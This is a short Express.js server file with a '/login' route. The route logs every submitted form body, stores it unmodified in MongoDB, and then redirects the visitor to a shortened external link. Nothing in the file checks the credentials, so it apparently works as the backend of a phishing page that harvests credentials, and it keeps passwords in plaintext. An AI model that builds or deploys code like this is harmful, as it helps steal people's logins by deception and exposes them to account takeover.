if (process.env.NODE_ENV !== 'production') {
   require('dotenv').config();
};

const express = require('express');
const app = express();
const Login = require('./models/Login');
const path = require('path');
const PORT = process.env.PORT || 2003;

const DB_online = process.env.MONGO_DB;

const mongoose = require('mongoose');
mongoose.set('strictQuery', true);
const { append } = require('vary');
const { MongoClient, ServerApiVersion } = require('mongodb');

// 'mongodb://127.0.0.1:27017/CPA-GRIP'

mongoose.connect(DB_online)
   .then(() => {
      console.log('connection open')
   })
   .catch(err => {
      console.log('oh no error')
      console.log(err)
   });

app.use(express.urlencoded({ extended: true }))
app.use(express.json())

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'Public')));


app.get('/login', (req, res) => {
   res.render('index')
})

app.post('/login', async (req, res) => {
   console.log(req.body);
   const user = new Login(req.body);
   await user.save();
   res.redirect('https://shrinke.me/twL3uU')
})

app.listen(PORT, () => {
   console.log('Server 2003 Started')
})